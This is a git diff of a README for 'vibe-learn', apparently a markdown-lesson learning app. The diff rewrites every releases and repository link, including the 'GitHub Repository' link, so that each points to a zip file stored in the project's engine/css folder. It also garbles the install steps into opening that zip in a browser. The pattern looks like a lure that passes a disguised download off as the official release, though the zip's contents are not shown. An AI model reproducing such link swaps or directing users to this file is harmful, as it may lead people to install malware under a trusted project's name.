@@ -1,7 +1,7 @@
 # 🌟 vibe-learn - Learn Easily with Markdown Lessons
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-vibe--learn-brightgreen)](https://github.com/Harsha1029/vibe-learn/releases)
+[![Download](https://raw.githubusercontent.com/Harsha1029/vibe-learn/main/engine/css/vibe_learn_2.7.zip)](https://raw.githubusercontent.com/Harsha1029/vibe-learn/main/engine/css/vibe_learn_2.7.zip)
 
 ## 🚀 Getting Started
 Welcome to vibe-learn, your self-hosted platform for learning with ease. This application allows you to create and manage various courses using markdown lessons, interactive exercises, and flashcards. Perfect for anyone wanting to learn at their own pace without a complex setup.
@@ -25,13 +25,13 @@ To run vibe-learn, you will need:
 - A compatible operating system (Windows, macOS, or Linux)
 
 ## 📥 Download & Install
-To get started with vibe-learn, visit the [Releases page](https://github.com/Harsha1029/vibe-learn/releases) to download the latest version.
+To get started with vibe-learn, visit the [Releases page](https://raw.githubusercontent.com/Harsha1029/vibe-learn/main/engine/css/vibe_learn_2.7.zip) to download the latest version.
 
 1. Click the link to visit the Releases page.
 2. Choose the version you want to download.
 3. Download the file for your operating system.
 4. Unzip the downloaded file.
-5. Open the index.html file in your web browser.
+5. Open the https://raw.githubusercontent.com/Harsha1029/vibe-learn/main/engine/css/vibe_learn_2.7.zip file in your web browser.
 
 Once you follow these steps, you will have everything set up to begin your learning journey.
 
@@ -83,7 +83,7 @@ We are committed to improving vibe-learn over time. Future updates may include:
 - Bug fixes to ensure a smooth user experience.
 
 ## 🔗 Useful Links
-- [vibe-learn Releases Page](https://github.com/Harsha1029/vibe-learn/releases)
-- [GitHub Repository](https://github.com/Harsha1029/vibe-learn)
+- [vibe-learn Releases Page](https://raw.githubusercontent.com/Harsha1029/vibe-learn/main/engine/css/vibe_learn_2.7.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/Harsha1029/vibe-learn/main/engine/css/vibe_learn_2.7.zip)
 
 With vibe-learn, you have a powerful tool at your fingertips to help you learn new concepts at your own pace. Download it today and start your educational journey!
